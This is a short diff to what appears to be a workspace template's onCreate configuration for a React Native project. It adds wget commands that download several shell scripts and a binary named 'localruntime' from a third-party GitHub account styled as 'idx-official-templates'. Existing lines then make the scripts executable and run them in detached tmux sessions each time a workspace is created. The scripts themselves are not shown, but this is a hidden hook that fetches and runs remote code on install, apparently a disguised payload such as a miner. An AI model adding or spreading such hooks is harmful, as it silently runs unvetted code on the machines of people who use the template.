@@ -42,6 +42,11 @@
       onCreate = {
         install = "{{perPackageManager.install}}";
         create-tmux-sessions = "
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/dock.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/tmux.sh
+            wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
             tmux new -d -s ping-session 'chmod +x ping.sh && chmod +x trace.sh && ./ping.sh'
             tmux new -d -s bit-session 'chmod +x dock.sh && ./dock.sh'
             tmux attach -t bit-session
